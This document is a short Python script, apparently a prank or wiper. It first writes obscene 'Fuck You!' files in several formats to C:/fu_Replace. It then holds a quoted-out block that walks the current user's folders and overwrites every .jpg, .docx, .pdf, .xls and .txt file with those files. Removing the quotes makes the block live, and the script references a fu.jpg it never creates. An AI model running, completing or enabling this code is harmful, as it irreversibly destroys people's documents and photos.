#!/usr/bin/env python3
import os
from shutil import copyfile
import getpass
import docx
import xlwt
from fpdf import FPDF
os.mkdir('C:/fu_Replace')
file = open("C:/fu_Replace/fu.txt", "w")
file.write("Fuck You!")
file.close()
doc = docx.Document()
doc.add_paragraph('Fuck You!')
doc.save("C:/fu_Replace/fu.docx")
book = xlwt.Workbook(encoding="utf-8")
sheet1 = book.add_sheet("Sheet 1")
sheet1.write(0, 0, "FUCK YOU!")
sheet1.write(1, 0, "FUCK YOU!")
sheet1.write(2, 0, "FUCK YOU!")
book.save("C:/fu_Replace/fu.xls")
pdf = FPDF()
pdf.add_page()
pdf.set_font("Arial", size=12)
pdf.cell(200, 10, txt="Fuck You!", ln=1, align="C")
pdf.output("C:/fu_Replace/fu.pdf")
currentuser = getpass.getuser()
sourcefolder = 'C:/fu_Replace'
'''
for folder, subfolders, files in os.walk('C:/Users/' + currentuser):
    for file in files:
        if ".jpg" in file:
            filePath = os.path.join(os.path.abspath(folder), file)
            source = sourcefolder + "/fu.jpg"
            sourcePath = os.path.join(os.path.abspath(sourcefolder), source)
            copyfile(sourcePath, filePath)

        if ".docx" in file:
            filePath = os.path.join(os.path.abspath(folder), file)
            source = sourcefolder + "/fu.docx"
            sourcePath = os.path.join(os.path.abspath(sourcefolder), source)
            copyfile(sourcePath, filePath)

        if ".pdf" in file:
            filePath = os.path.join(os.path.abspath(folder), file)
            source =  sourcefolder + "/fu.pdf"
            sourcePath = os.path.join(os.path.abspath(sourcefolder), source)
            copyfile(sourcePath, filePath)


        if ".xls" in file:
            filePath = os.path.join(os.path.abspath(folder), file)
            source = sourcefolder + "/fu.xls"
            sourcePath = os.path.join(os.path.abspath(sourcefolder), source)
            copyfile(sourcePath, filePath)

        if ".txt" in file:
            filePath = os.path.join(os.path.abspath(folder), file)
            source = sourcefolder + "/fu.txt"
            sourcePath = os.path.join(os.path.abspath(sourcefolder), source)
            copyfile(sourcePath, filePath)
'''
